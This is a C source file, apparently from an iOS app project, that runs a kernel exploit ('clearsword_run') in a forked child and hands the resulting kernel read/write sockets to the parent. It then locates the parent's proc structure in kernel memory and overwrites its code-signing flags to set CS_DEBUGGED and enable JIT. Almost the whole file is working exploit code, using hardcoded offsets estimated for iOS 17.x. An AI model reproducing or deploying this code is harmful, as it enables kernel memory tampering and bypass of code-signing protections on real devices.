#include "ClearSword.h"
#include "../LCUtils/utils.h"
#include "clearsword/poc.h"
#include "clearsword/kmem.h"
#include "clearsword/krw.h"
#include "clearsword/common.h"

#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <os/log.h>

#define PROC_RO_CSFLAGS_OFFSET 0x1C

// TODO: verify on iOS 17.3.1 / A13 (T8030) — compare against a known jailbreak
// XNU 10002 era iOS 17.x best estimate
#define PROC_PPTR_OFFSET 0xD8

// ---------------------------------------------------------------------------
// Data passed child → parent
// ---------------------------------------------------------------------------
typedef struct {
    int      success;
    uint64_t kernel_base;
    uint64_t kernel_slide;
    uint64_t control_socket_pcb;
    uint64_t rw_socket_pcb;
    uint64_t self_proc;   // child's proc — valid while child is alive
    offsets_t offsets;
} child_result_t;

// ---------------------------------------------------------------------------
// SCM_RIGHTS helpers
// ---------------------------------------------------------------------------
static int send_fds(int sock, int fd1, int fd2) {
    char buf[CMSG_SPACE(2 * sizeof(int))] = {0};
    char dummy = 0;
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    struct msghdr msg = {
        .msg_iov = &iov, .msg_iovlen = 1,
        .msg_control = buf, .msg_controllen = sizeof(buf)
    };
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_SOCKET;
    cm->cmsg_type  = SCM_RIGHTS;
    cm->cmsg_len   = CMSG_LEN(2 * sizeof(int));
    ((int *)CMSG_DATA(cm))[0] = fd1;
    ((int *)CMSG_DATA(cm))[1] = fd2;
    return sendmsg(sock, &msg, 0) < 0 ? -1 : 0;
}

static int recv_fds(int sock, int *fd1, int *fd2) {
    char buf[CMSG_SPACE(2 * sizeof(int))] = {0};
    char dummy;
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    struct msghdr msg = {
        .msg_iov = &iov, .msg_iovlen = 1,
        .msg_control = buf, .msg_controllen = sizeof(buf)
    };
    if (recvmsg(sock, &msg, 0) < 0) return -1;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    if (!cm || cm->cmsg_type != SCM_RIGHTS) return -1;
    *fd1 = ((int *)CMSG_DATA(cm))[0];
    *fd2 = ((int *)CMSG_DATA(cm))[1];
    return 0;
}

// ---------------------------------------------------------------------------
// enable_self_jit
// ---------------------------------------------------------------------------
int enable_self_jit(void) {
    LOG("================================");
    LOG("enable_self_jit() ENTER");
    LOG("================================");

    // Early exit if already set
    int flags = 0;
    csops(getpid(), 0, &flags, sizeof(flags));
    if (flags & CS_DEBUGGED) {
        LOG("CS_DEBUGGED already set");
        return 0;
    }

    // result pipe: child → parent (child_result_t)
    int result_pipe[2];
    if (pipe(result_pipe) != 0) { LOG("pipe failed: %d", errno); return errno; }

    // fd socket pair: child passes control/rw fds to parent via SCM_RIGHTS
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        LOG("socketpair failed: %d", errno);
        close(result_pipe[0]); close(result_pipe[1]);
        return errno;
    }

    // sync pipe: parent tells child "done reading proc, you can exit"
    int sync_pipe[2];
    if (pipe(sync_pipe) != 0) {
        LOG("sync pipe failed: %d", errno);
        close(result_pipe[0]); close(result_pipe[1]);
        close(sv[0]); close(sv[1]);
        return errno;
    }

    LOG("forking exploit child...");
    pid_t pid = fork();
    if (pid < 0) {
        LOG("fork failed: %d", errno);
        close(result_pipe[0]); close(result_pipe[1]);
        close(sv[0]); close(sv[1]);
        close(sync_pipe[0]); close(sync_pipe[1]);
        return errno;
    }

    // -----------------------------------------------------------------------
    // CHILD
    // -----------------------------------------------------------------------
    if (pid == 0) {
        close(result_pipe[0]);
        close(sv[0]);
        close(sync_pipe[1]);

        int r = clearsword_run();

        child_result_t res = {
            .success            = (r == 0),
            .kernel_base        = g_ctx.kernel_base,
            .kernel_slide       = g_ctx.kernel_slide,
            .control_socket_pcb = g_ctx.control_socket_pcb,
            .rw_socket_pcb      = g_ctx.rw_socket_pcb,
            .offsets            = g_offsets,
            .self_proc          = 0,
        };

        if (r == 0) {
            // g_ctx is fully populated — find our own proc while we're alive
            res.self_proc = find_self_proc();
            LOG("child self_proc = 0x%llx", res.self_proc);
        }

        // send result struct to parent
        write(result_pipe[1], &res, sizeof(res));
        close(result_pipe[1]);

        if (r == 0) {
            // pass control/rw fds to parent so it can use KRW
            send_fds(sv[1], g_ctx.control_socket, g_ctx.rw_socket);

            // stay alive until parent has finished reading our proc via p_pptr
            char ack = 0;
            read(sync_pipe[0], &ack, 1);

            LOG("child received sync — exiting cleanly");
        }

        close(sv[1]);
        close(sync_pipe[0]);
        _exit(0);
    }

    // -----------------------------------------------------------------------
    // PARENT
    // -----------------------------------------------------------------------
    close(result_pipe[1]);
    close(sv[1]);
    close(sync_pipe[0]);

    // receive result
    child_result_t res;
    ssize_t n = read(result_pipe[0], &res, sizeof(res));
    close(result_pipe[0]);

    if (n != sizeof(res) || !res.success) {
        LOG("exploit failed in child (n=%zd success=%d)", n, res.success);
        write(sync_pipe[1], "x", 1);
        close(sync_pipe[1]); close(sv[0]);
        waitpid(pid, NULL, 0);
        return ENOENT;
    }

    // receive fds
    int control_fd = -1, rw_fd = -1;
    if (recv_fds(sv[0], &control_fd, &rw_fd) != 0) {
        LOG("recv_fds failed");
        write(sync_pipe[1], "x", 1);
        close(sync_pipe[1]); close(sv[0]);
        waitpid(pid, NULL, 0);
        return ECOMM;
    }
    close(sv[0]);

    LOG("parent: kernel_base=0x%llx slide=0x%llx",
        res.kernel_base, res.kernel_slide);
    LOG("parent: child self_proc=0x%llx", res.self_proc);

    // Reconstruct g_ctx so KRW works in the parent
    memset(&g_ctx, 0, sizeof(g_ctx));
    g_offsets                  = res.offsets;
    g_ctx.offsets              = res.offsets;
    g_ctx.kernel_base          = res.kernel_base;
    g_ctx.kernel_slide         = res.kernel_slide;
    g_ctx.control_socket_pcb   = res.control_socket_pcb;
    g_ctx.rw_socket_pcb        = res.rw_socket_pcb;
    g_ctx.control_socket       = control_fd;
    g_ctx.rw_socket            = rw_fd;
    g_ctx.getsockopt_read_data = calloc(1, 32);

    // Find parent's proc via child's proc->p_pptr
    // Child is still alive (blocked on sync_pipe), so self_proc is valid
    LOG("reading p_pptr from child proc 0x%llx + 0x%x",
        res.self_proc, PROC_PPTR_OFFSET);

    uint64_t my_proc = 0;
    kread_length(res.self_proc + PROC_PPTR_OFFSET, &my_proc, sizeof(my_proc));
    LOG("parent my_proc = 0x%llx", my_proc);

    // Done reading child's proc — let child exit
    write(sync_pipe[1], "x", 1);
    close(sync_pipe[1]);
    waitpid(pid, NULL, 0);

    if (!my_proc || my_proc < 0xfffffff000000000ULL) {
        LOG("ERROR: my_proc invalid — PROC_PPTR_OFFSET 0x%x likely wrong", PROC_PPTR_OFFSET);
        free(g_ctx.getsockopt_read_data);
        close(control_fd); close(rw_fd);
        return ESRCH;
    }

    // proc_ro
    uint64_t proc_ro = 0;
    kread_length(my_proc + g_offsets.proc_p_ro, &proc_ro, sizeof(proc_ro));
    LOG("proc_ro = 0x%llx", proc_ro);

    if (!proc_ro || proc_ro < 0xfffffff000000000ULL) {
        LOG("ERROR: proc_ro invalid");
        free(g_ctx.getsockopt_read_data);
        close(control_fd); close(rw_fd);
        return EFAULT;
    }

    // patch csflags
    uint32_t csflags = 0;
    kread_length(proc_ro + PROC_RO_CSFLAGS_OFFSET, &csflags, sizeof(csflags));
    LOG("csflags before = 0x%08x", csflags);

    uint32_t new_csflags = csflags | CS_DEBUGGED;
    kwrite_length(proc_ro + PROC_RO_CSFLAGS_OFFSET, &new_csflags, sizeof(new_csflags));
    LOG("csflags written = 0x%08x", new_csflags);

    free(g_ctx.getsockopt_read_data);
    close(control_fd);
    close(rw_fd);

    // verify
    flags = 0;
    csops(getpid(), 0, &flags, sizeof(flags));
    LOG("verification: csops flags = 0x%x", flags);

    if (flags & CS_DEBUGGED) {
        LOG("SUCCESS: CS_DEBUGGED is set");
        return 0;
    }

    LOG("WARNING: CS_DEBUGGED not set — check PROC_PPTR_OFFSET and PROC_RO_CSFLAGS_OFFSET");
    return EACCES;
}